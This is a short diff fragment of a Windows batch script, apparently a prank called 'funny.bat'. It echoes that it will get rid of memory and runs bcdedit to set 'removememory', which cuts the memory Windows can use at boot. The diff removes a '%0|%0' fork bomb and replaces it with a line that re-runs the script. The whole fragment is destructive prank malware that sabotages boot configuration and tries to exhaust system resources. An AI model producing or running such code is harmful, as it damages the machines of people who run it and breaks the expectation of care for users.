@@ -20,5 +20,5 @@ echo Will be getting rid of %c% bytes of memory
 bcdedit.exe /set removememory %c% 
 
 
-%0|%0
+funny.bat
  
